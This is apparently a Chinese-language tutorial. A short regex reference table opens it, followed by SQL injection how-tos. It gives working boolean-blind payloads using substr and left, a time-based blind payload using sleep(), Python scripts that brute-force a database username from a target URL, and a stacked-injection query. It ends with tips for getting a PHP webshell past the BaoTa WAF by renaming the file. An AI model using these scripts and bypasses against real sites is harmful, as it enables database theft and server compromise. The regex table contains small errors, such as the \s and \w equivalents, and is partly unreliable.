正则对照表

 ^   从开头匹配      py3不加此条件为全局匹配
 
.   用于匹配除换行符(\n)之外的任意字符
 
$  从末尾匹配       py3不加此条件为全局匹配
 
*  指定一个字符可以被匹配零次或者多次，而不是只有一次   *{8}  匹配八次  >=0
 
+  指定一个字符可以被匹配一次或者多次  >=1 

?   匹配一次或者零次
 
|  或者
	 
\b   匹配一个单词的边界，也就是指单词和空格间的位置
	 
\d  代表所有数字0-9
	 
\D  代表匹配非数字字符除了0-9
	
\s   匹配任何空字符（空格） ；相当于 [\t\tn\r\f\v]
	 
\S  匹配任何非空字符；相当于 [^\t\n\f\r\v]
	 
\w 匹配任何字母数字字符；相当于[a-zA-Z0-9]
	 
\W 匹配任何非字母数字字符；相当于[^a-zA-Z0-9]
	 
{m}   用于验证将前面的模式匹配m次
	
{m,}  用于将前面的模式匹配m次或者多次   >=m
	
{m,n}   用于将前面的模式匹配大于等于m次并且小于等于n次

 substr注入

首先我们可以通过substr()进行判断 ，这里我发现了一个很奇怪的地方，这里可以获取数据库的用户名，反而不能获得数据库的库名，但是我们可以通过报错他会输出库名

substr(值,从那个数开始,取几位)
version()            # MySQL版本
user()               # 数据库用户名
database()           # 数据库名
@@datadir            # 数据库路径
@@version_compile_os # 操作系统版本
-1 || substr(user(),1,1) = 's' #

然后这时候，我们能通过这个方法获取到数据库的用户名这里我使用python来跑一下，利用自动化的脚本工具来进行脚本不爆破，可爆破出用户名

import requests
from bs4 import BeautifulSoup
def sql(host):
    q='1234567890qwertyuiopasdfghjklzxcvbnm@._'
    text1=""
    for i in range(20):
        for y in q:
            poc1="-1 || substr(user(),"+str(i)+",1) = '"+y+"' #"
            res=requests.get(url=host+poc1)
            soup = BeautifulSoup(res.text, "html.parser")
            for t in soup.find_all('font'): 
                if(t.get('size')=='5'):
                    text1=text1+y
                    print(text1)

left注入

同时我们也可以使用类似于的left语句进行注入攻击，left语句我们可以通过他，来爆破出数据库的用户名

left(值,从第一开始取几位)
version()            # MySQL版本
user()               # 数据库用户名
database()           # 数据库名
@@datadir            # 数据库路径
@@version_compile_os # 操作系统版本
-1 || left(user(),1)='s' #

left的性质类似于substr，所以我们也可以在之前的脚本上面进行修改一下，从而获得一个left绕waf的脚本工具，这里我们采用的方式是利用判断当前页面是font标签大小是否是5。

import requests
from bs4 import BeautifulSoup
def sql(host):
    q='1234567890qwertyuiopasdfghjklzxcvbnm@._'
    text1=""
    for i in range(1,20):
        for y in q:
            poc1="-1 || left(user(),"+str(i)+")='"+text1+""+y+"' #"  
            res=requests.get(url=host+poc1)
            soup = BeautifulSoup(res.text, "html.parser")
            for t in soup.find_all('font'): 
                if(t.get('size')=='5'):
                    text1=text1+y
                    print(text1)

host='http://ip/sql/Less-1/?id='
sql(host)

时间盲注入

有时候，可能不会像上面那种会回显的，我们就可以使用sleep函数进行攻击。

当前网页这条成立
这条是成立的
?id=-1 || if(left(user(),1)='s',sleep(0.2),1) #
这条不成立
?id=-1 || if(left(user(),1)='q',sleep(0.2),1) #

可以直观的观察到，很明显有一个时间延迟的回响，我们就可以借此进行，获取数据库用户名，这里我们依旧修改一下python脚本

import requests
from bs4 import BeautifulSoup
def sql(host):
    q='1234567890qwertyuiopasdfghjklzxcvbnm@._'
    text1=""
    for i in range(1,20):
        for y in q:
            poc1="-1 || if(left(user(),"+str(i)+")='"+text1+""+y+"',sleep(0.2),1) #" 
            res=requests.get(url=host+poc1)
            #print(res.elapsed.microseconds)
            if(res.elapsed.microseconds>=60000):
                    text1=text1+y
                    print(text1)

关于脏数据+堆叠注入

?id=1 ; Create table security.test3(id int);#

?id=1 ; Create table security.test3(id int);#

顺便提一下，似乎宝塔对文件上传并没有防护，宝塔5.9waf对于文件上传并不会有检测,但是会拦截执行,如要进行上传则需要绕过waf的检测拦截。

宝塔会根据我们上传的文件用户名进行判断，这里使用的是shell.php进行上马，我们能很清楚的看见他被拦截了。

如果转换一个文件名，从shell改成123e.php，就不会被拦截，但是宝塔他会主动的降权，让你需要通过提权手段，进行尝试提权升级权限。
